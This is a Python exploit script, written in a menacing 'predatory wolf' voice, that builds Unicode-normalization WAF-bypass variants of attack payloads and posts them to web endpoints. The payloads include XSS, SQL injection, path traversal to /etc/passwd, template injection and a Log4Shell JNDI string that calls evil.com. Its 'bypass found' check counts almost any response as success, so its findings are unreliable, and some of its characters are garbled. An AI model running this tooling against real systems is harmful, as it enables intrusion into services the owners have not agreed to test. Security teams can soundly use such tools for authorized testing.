#!/usr/bin/env python3
"""ğŸº Unicode Normalization Bypass Exploits

*snarls with predatory intelligence* These exploits leverage Unicode normalization
vulnerabilities to bypass WAFs and security controls. Visual confusables, overlong
encodings, and improper case mappings are our weapons of choice!

Based on 2025 research showing flaws in Unicode normalization can bypass security
mechanisms in web applications and WAFs.
"""

import asyncio
import logging
import unicodedata
from typing import Any

import aiohttp

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class UnicodeNormalizationBypass:
    """ğŸº *teeth gleam with menace* Unicode normalization exploit class that hunts
    for vulnerabilities in WAF parsing and backend validation through various
    Unicode manipulation techniques.
    """

    def __init__(self, target_url: str = "http://localhost:8000"):
        self.target_url = target_url.rstrip("/")
        self.session: aiohttp.ClientSession | None = None

        # Unicode confusables for bypassing string matching
        self.confusables = {
            "a": [
                "Ğ°",
                "É‘",
                "Î±",
                "ğš",
                "ğ‘",
                "ğ’‚",
                "ğ“ª",
                "ğ”",
                "ğ•’",
                "ğ–†",
                "ğ–º",
                "ğ—®",
                "ğ˜¢",
                "ğ™–",
                "ğšŠ",
            ],
            "e": ["Ğµ", "â„¯", "ğ", "ğ‘’", "ğ’†", "ğ“®", "ğ”¢", "ğ•–", "ğ–Š", "ğ–¾", "ğ—²", "ğ˜¦", "ğ™š", "ğš"],
            "o": ["Ğ¾", "Î¿", "ğ¨", "ğ‘œ", "ğ’", "ğ“¸", "ğ”¬", "ğ• ", "ğ–”", "ğ—ˆ", "ğ—¼", "ğ˜°", "ğ™¤", "ğš˜"],
            "i": ["Ñ–", "Î¹", "ğ¢", "ğ‘–", "ğ’Š", "ğ“²", "ğ”¦", "ğ•š", "ğ–", "ğ—‚", "ğ—¶", "ğ˜ª", "ğ™", "ğš’"],
            "u": ["Ï…", "Õ½", "ğ®", "ğ‘¢", "ğ’–", "ğ“¾", "ğ”²", "ğ•¦", "ğ–š", "ğ—", "ğ˜‚", "ğ˜¶", "ğ™ª", "ğš"],
            "n": ["Ğ¿", "Õ¸", "ğ§", "ğ‘›", "ğ’", "ğ“·", "ğ”«", "ğ•Ÿ", "ğ–“", "ğ—‡", "ğ—»", "ğ˜¯", "ğ™£", "ğš—"],
            "c": ["Ñ", "Ï²", "ğœ", "ğ‘", "ğ’„", "ğ“¬", "ğ” ", "ğ•”", "ğ–ˆ", "ğ–¼", "ğ—°", "ğ˜¤", "ğ™˜", "ğšŒ"],
            "r": ["Ğ³", "â²…", "ğ«", "ğ‘Ÿ", "ğ’“", "ğ“»", "ğ”¯", "ğ•£", "ğ–—", "ğ—‹", "ğ—¿", "ğ˜³", "ğ™§", "ğš›"],
            "p": ["Ñ€", "Ï", "ğ©", "ğ‘", "ğ’‘", "ğ“¹", "ğ”­", "ğ•¡", "ğ–•", "ğ—‰", "ğ—½", "ğ˜±", "ğ™¥", "ğš™"],
            "h": ["Ò»", "â„", "ğ¡", "ğ’½", "ğ’‰", "ğ“±", "ğ”¥", "ğ•™", "ğ–", "ğ—", "ğ—µ", "ğ˜©", "ğ™", "ğš‘"],
            "s": ["Ñ•", "ğ¬", "ğ‘ ", "ğ’”", "ğ“¼", "ğ”°", "ğ•¤", "ğ–˜", "ğ—Œ", "ğ˜€", "ğ˜´", "ğ™¨", "ğšœ"],
            "t": ["Ñ‚", "Ï„", "ğ­", "ğ‘¡", "ğ’•", "ğ“½", "ğ”±", "ğ•¥", "ğ–™", "ğ—", "ğ˜", "ğ˜µ", "ğ™©", "ğš"],
            "x": ["Ñ…", "Ï‡", "ğ±", "ğ‘¥", "ğ’™", "ğ”", "ğ”µ", "ğ•©", "ğ–", "ğ—‘", "ğ˜…", "ğ˜¹", "ğ™­", "ğš¡"],
            "y": ["Ñƒ", "Î³", "ğ²", "ğ‘¦", "ğ’š", "ğ”‚", "ğ”¶", "ğ•ª", "ğ–", "ğ—’", "ğ˜†", "ğ˜º", "ğ™®", "ğš¢"],
            "j": ["Ñ˜", "ğ£", "ğ‘—", "ğ’‹", "ğ“³", "ğ”§", "ğ•›", "ğ–", "ğ—ƒ", "ğ—·", "ğ˜«", "ğ™Ÿ", "ğš“"],
            "l": ["Ó", "â…¼", "ğ¥", "ğ‘™", "ğ’", "ğ“µ", "ğ”©", "ğ•", "ğ–‘", "ğ—…", "ğ—¹", "ğ˜­", "ğ™¡", "ğš•"],
            "w": ["Ô", "Ï‰", "ğ°", "ğ‘¤", "ğ’˜", "ğ”€", "ğ”´", "ğ•¨", "ğ–œ", "ğ—", "ğ˜„", "ğ˜¸", "ğ™¬", "ğš "],
            "m": ["Ğ¼", "â…¿", "ğ¦", "ğ‘š", "ğ’", "ğ“¶", "ğ”ª", "ğ•", "ğ–’", "ğ—†", "ğ—º", "ğ˜®", "ğ™¢", "ğš–"],
            "v": ["Î½", "Ñµ", "ğ¯", "ğ‘£", "ğ’—", "ğ“¿", "ğ”³", "ğ•§", "ğ–›", "ğ—", "ğ˜ƒ", "ğ˜·", "ğ™«", "ğšŸ"],
            "q": ["Ô›", "ğª", "ğ‘", "ğ’’", "ğ“º", "ğ”®", "ğ•¢", "ğ––", "ğ—Š", "ğ—¾", "ğ˜²", "ğ™¦", "ğšš"],
            "k": ["Ğº", "Îº", "ğ¤", "ğ‘˜", "ğ’Œ", "ğ“´", "ğ”¨", "ğ•œ", "ğ–", "ğ—„", "ğ—¸", "ğ˜¬", "ğ™ ", "ğš”"],
            "g": ["Ö", "ğ ", "ğ‘”", "ğ’ˆ", "ğ“°", "ğ”¤", "ğ•˜", "ğ–Œ", "ğ—€", "ğ—´", "ğ˜¨", "ğ™œ", "ğš"],
            "b": ["Ğ¬", "Ò", "ğ›", "ğ‘", "ğ’ƒ", "ğ“«", "ğ”Ÿ", "ğ•“", "ğ–‡", "ğ–»", "ğ—¯", "ğ˜£", "ğ™—", "ğš‹"],
            "d": ["Ô", "ğ", "ğ‘‘", "ğ’…", "ğ“­", "ğ”¡", "ğ••", "ğ–‰", "ğ–½", "ğ—±", "ğ˜¥", "ğ™™", "ğš"],
            "f": ["á¸Ÿ", "ğŸ", "ğ‘“", "ğ’‡", "ğ“¯", "ğ”£", "ğ•—", "ğ–‹", "ğ–¿", "ğ—³", "ğ˜§", "ğ™›", "ğš"],
            "z": ["á´¢", "ğ³", "ğ‘§", "ğ’›", "ğ”ƒ", "ğ”·", "ğ•«", "ğ–Ÿ", "ğ—“", "ğ˜‡", "ğ˜»", "ğ™¯", "ğš£"],
        }

        # Overlong UTF-8 sequences
        self.overlong_sequences = {
            "<": ["\xc0\xbc", "\xe0\x80\xbc", "\xf0\x80\x80\xbc"],
            ">": ["\xc0\xbe", "\xe0\x80\xbe", "\xf0\x80\x80\xbe"],
            '"': ["\xc0\xa2", "\xe0\x80\xa2", "\xf0\x80\x80\xa2"],
            "'": ["\xc0\xa7", "\xe0\x80\xa7", "\xf0\x80\x80\xa7"],
            "/": ["\xc0\xaf", "\xe0\x80\xaf", "\xf0\x80\x80\xaf"],
            "\\": ["\xc0\xac", "\xe0\x80\xac", "\xf0\x80\x80\xac"],
            ".": ["\xc0\xae", "\xe0\x80\xae", "\xf0\x80\x80\xae"],
            "=": ["\xc0\xbd", "\xe0\x80\xbd", "\xf0\x80\x80\xbd"],
            "&": ["\xc0\xa6", "\xe0\x80\xa6", "\xf0\x80\x80\xa6"],
            "?": ["\xc0\xbf", "\xe0\x80\xbf", "\xf0\x80\x80\xbf"],
            " ": ["\xc0\xa0", "\xe0\x80\xa0", "\xf0\x80\x80\xa0"],
        }

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    def generate_confusable_payloads(self, base_payload: str) -> list[str]:
        """ğŸº *snarls with cunning* Generate visually similar payloads using Unicode
        confusables to bypass string-based WAF rules.
        """
        payloads = [base_payload]

        # Single character substitutions
        for i, char in enumerate(base_payload.lower()):
            if char in self.confusables:
                for confusable in self.confusables[char][:3]:  # Use first 3 confusables
                    new_payload = base_payload[:i] + confusable + base_payload[i + 1 :]
                    payloads.append(new_payload)

        # Multiple character substitutions
        confusable_payload = ""
        for char in base_payload.lower():
            if char in self.confusables:
                confusable_payload += self.confusables[char][0]
            else:
                confusable_payload += char

        if confusable_payload != base_payload:
            payloads.append(confusable_payload)

        return payloads

    def generate_overlong_payloads(self, base_payload: str) -> list[str]:
        """ğŸº *teeth gleam with satisfaction* Generate overlong UTF-8 encoded payloads
        to bypass WAF parsing that doesn't properly handle malformed Unicode.
        """
        payloads = []

        for char, sequences in self.overlong_sequences.items():
            if char in base_payload:
                for seq in sequences:
                    new_payload = base_payload.replace(char, seq)
                    payloads.append(new_payload)

        return payloads

    def generate_normalization_payloads(self, base_payload: str) -> list[str]:
        """ğŸº *howls with predatory glee* Generate payloads using different Unicode
        normalization forms to exploit inconsistent normalization handling.
        """
        payloads = []

        # Different normalization forms
        forms = ["NFC", "NFD", "NFKC", "NFKD"]

        for form in forms:
            try:
                normalized = unicodedata.normalize(form, base_payload)
                if normalized != base_payload:
                    payloads.append(normalized)
            except Exception:
                pass

        # Mixed normalization - normalize different parts differently
        if len(base_payload) > 2:
            mid = len(base_payload) // 2
            mixed1 = unicodedata.normalize(
                "NFC",
                base_payload[:mid],
            ) + unicodedata.normalize("NFD", base_payload[mid:])
            mixed2 = unicodedata.normalize(
                "NFD",
                base_payload[:mid],
            ) + unicodedata.normalize("NFC", base_payload[mid:])
            payloads.extend([mixed1, mixed2])

        return payloads

    def generate_case_mapping_payloads(self, base_payload: str) -> list[str]:
        """ğŸº *snarls with cunning intelligence* Generate payloads exploiting improper
        case mapping handling in Unicode processing.
        """
        payloads = []

        # Turkish I problem and similar case mapping issues
        turkish_mappings = {
            "i": "Ä°",  # Latin Small Letter I -> Latin Capital Letter I With Dot Above
            "I": "Ä±",  # Latin Capital Letter I -> Latin Small Letter Dotless I
        }

        for char, mapping in turkish_mappings.items():
            if char in base_payload:
                new_payload = base_payload.replace(char, mapping)
                payloads.append(new_payload)

        # Special Unicode case conversions
        payloads.extend(
            [
                base_payload.upper(),
                base_payload.lower(),
                base_payload.title(),
                base_payload.swapcase(),
                base_payload.casefold(),  # More aggressive lowercase
            ],
        )

        return list(set(payloads))  # Remove duplicates

    def generate_truncation_payloads(self, base_payload: str) -> list[str]:
        """ğŸº *bares fangs menacingly* Generate payloads that exploit Unicode truncation
        vulnerabilities in systems with different length limits.
        """
        payloads = []

        # Add invisible characters that might be truncated
        invisible_chars = [
            "\u200b",  # Zero Width Space
            "\u200c",  # Zero Width Non-Joiner
            "\u200d",  # Zero Width Joiner
            "\u2060",  # Word Joiner
            "\ufeff",  # Zero Width No-Break Space
            "\u034f",  # Combining Grapheme Joiner
        ]

        for char in invisible_chars:
            # Add at beginning, middle, and end
            payloads.append(char + base_payload)
            payloads.append(base_payload + char)
            if len(base_payload) > 2:
                mid = len(base_payload) // 2
                payloads.append(base_payload[:mid] + char + base_payload[mid:])

        # Add combining characters that might affect truncation
        combining_chars = [
            "\u0300",  # Combining Grave Accent
            "\u0301",  # Combining Acute Accent
            "\u0302",  # Combining Circumflex Accent
            "\u0303",  # Combining Tilde
            "\u0304",  # Combining Macron
        ]

        for char in combining_chars:
            if len(base_payload) > 0:
                # Add combining character to first character
                payloads.append(base_payload[0] + char + base_payload[1:])

        return payloads

    async def test_unicode_bypass(
        self,
        endpoint: str,
        parameter: str,
        base_payload: str,
    ) -> dict[str, Any]:
        """ğŸº *coordinated pack attack* Test Unicode normalization bypasses against
        a specific endpoint and parameter.
        """
        results = {
            "endpoint": endpoint,
            "parameter": parameter,
            "base_payload": base_payload,
            "successful_bypasses": [],
            "error_responses": [],
            "total_tests": 0,
            "bypasses_found": 0,
        }

        if not self.session:
            logger.error("Session not initialized. Use async context manager.")
            return results

        # Generate all payload variations
        all_payloads = []
        all_payloads.extend(self.generate_confusable_payloads(base_payload))
        all_payloads.extend(self.generate_overlong_payloads(base_payload))
        all_payloads.extend(self.generate_normalization_payloads(base_payload))
        all_payloads.extend(self.generate_case_mapping_payloads(base_payload))
        all_payloads.extend(self.generate_truncation_payloads(base_payload))

        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for payload in all_payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)

        results["total_tests"] = len(unique_payloads)
        logger.info(
            f"ğŸº Testing {len(unique_payloads)} Unicode bypass payloads against {endpoint}",
        )

        # Test each payload
        for i, payload in enumerate(unique_payloads):
            try:
                # Test with different encoding methods
                test_data = {parameter: payload}

                async with self.session.post(
                    f"{self.target_url}{endpoint}",
                    data=test_data,
                    timeout=10,
                ) as response:

                    response_text = await response.text()

                    # Check for signs of successful bypass
                    bypass_indicators = [
                        response.status == 200,
                        "error" not in response_text.lower(),
                        "blocked" not in response_text.lower(),
                        "forbidden" not in response_text.lower(),
                        "rejected" not in response_text.lower(),
                        len(response_text) > 100,  # Substantial response
                    ]

                    if any(bypass_indicators):
                        results["successful_bypasses"].append(
                            {
                                "payload": payload,
                                "status_code": response.status,
                                "response_length": len(response_text),
                                "bypass_type": self._identify_bypass_type(
                                    payload,
                                    base_payload,
                                ),
                                "encoding": "UTF-8",
                            },
                        )
                        results["bypasses_found"] += 1
                        logger.warning(f"ğŸº BYPASS FOUND: {payload[:50]}...")

                    if response.status >= 400:
                        results["error_responses"].append(
                            {
                                "payload": payload,
                                "status_code": response.status,
                                "error_message": response_text[:200],
                            },
                        )

            except Exception as e:
                logger.error(f"Error testing payload {i+1}: {e!s}")
                results["error_responses"].append({"payload": payload, "error": str(e)})

            # Progress indicator
            if (i + 1) % 10 == 0:
                logger.info(f"ğŸº Tested {i+1}/{len(unique_payloads)} payloads...")

        logger.info(
            f"ğŸº Unicode bypass test complete: {results['bypasses_found']} bypasses found",
        )
        return results

    def _identify_bypass_type(self, payload: str, base_payload: str) -> str:
        """Identify which type of Unicode bypass was used."""
        if any(
            char in payload for chars in self.confusables.values() for char in chars
        ):
            return "confusable_characters"
        if any(
            seq in payload.encode("utf-8", "replace")
            for sequences in self.overlong_sequences.values()
            for seq in sequences
        ):
            return "overlong_encoding"
        if unicodedata.normalize("NFC", payload) != payload:
            return "normalization_form"
        if payload != base_payload and payload.lower() == base_payload.lower():
            return "case_mapping"
        if any(
            char in payload
            for char in ["\u200b", "\u200c", "\u200d", "\u2060", "\ufeff", "\u034f"]
        ):
            return "invisible_characters"
        return "unknown"

    async def comprehensive_unicode_test(self) -> dict[str, Any]:
        """ğŸº *alpha pack coordination* Run comprehensive Unicode bypass tests
        against common vulnerable endpoints.
        """
        test_endpoints = [
            ("/api/search", "query"),
            ("/api/users/create", "username"),
            ("/api/auth/login", "email"),
            ("/api/comments/create", "content"),
            ("/api/files/upload", "filename"),
            ("/api/settings/update", "value"),
        ]

        test_payloads = [
            '<script>alert("XSS")</script>',
            "'OR 1=1--",
            "../../../etc/passwd",
            "admin",
            "SELECT * FROM users",
            "${jndi:ldap://evil.com/a}",
            "javascript:alert(1)",
            "{{7*7}}",
            "<%=7*7%>",
        ]

        all_results = {
            "test_summary": {
                "total_endpoints": len(test_endpoints),
                "total_payloads": len(test_payloads),
                "total_tests": len(test_endpoints) * len(test_payloads),
                "bypasses_found": 0,
                "endpoints_vulnerable": 0,
            },
            "endpoint_results": [],
        }

        logger.info("ğŸº Starting comprehensive Unicode bypass testing...")

        for endpoint, parameter in test_endpoints:
            endpoint_vulnerable = False
            endpoint_results = {
                "endpoint": endpoint,
                "parameter": parameter,
                "payload_results": [],
                "total_bypasses": 0,
            }

            for payload in test_payloads:
                result = await self.test_unicode_bypass(endpoint, parameter, payload)
                endpoint_results["payload_results"].append(result)
                endpoint_results["total_bypasses"] += result["bypasses_found"]

                if result["bypasses_found"] > 0:
                    endpoint_vulnerable = True
                    all_results["test_summary"]["bypasses_found"] += result[
                        "bypasses_found"
                    ]

            if endpoint_vulnerable:
                all_results["test_summary"]["endpoints_vulnerable"] += 1

            all_results["endpoint_results"].append(endpoint_results)

        logger.info(
            f"ğŸº Comprehensive test complete: {all_results['test_summary']['bypasses_found']} total bypasses found",
        )
        return all_results


async def main():
    """ğŸº *howls with predatory satisfaction* Main hunting function for Unicode
    normalization bypass testing.
    """
    target_url = "http://localhost:8000"

    async with UnicodeNormalizationBypass(target_url) as exploit:
        print("ğŸº Starting Unicode Normalization Bypass Exploitation...")

        # Run comprehensive tests
        results = await exploit.comprehensive_unicode_test()

        print("\nğŸº HUNT RESULTS:")
        print(f"Total bypasses found: {results['test_summary']['bypasses_found']}")
        print(
            f"Vulnerable endpoints: {results['test_summary']['endpoints_vulnerable']}",
        )

        # Show detailed results for vulnerable endpoints
        for endpoint_result in results["endpoint_results"]:
            if endpoint_result["total_bypasses"] > 0:
                print(f"\nğŸº VULNERABLE: {endpoint_result['endpoint']}")
                print(f"Parameter: {endpoint_result['parameter']}")
                print(f"Bypasses found: {endpoint_result['total_bypasses']}")

                for payload_result in endpoint_result["payload_results"]:
                    if payload_result["bypasses_found"] > 0:
                        print(f"  Payload: {payload_result['base_payload']}")
                        for bypass in payload_result["successful_bypasses"]:
                            print(
                                f"    âœ“ {bypass['bypass_type']}: {bypass['payload'][:50]}...",
                            )


if __name__ == "__main__":
    asyncio.run(main())
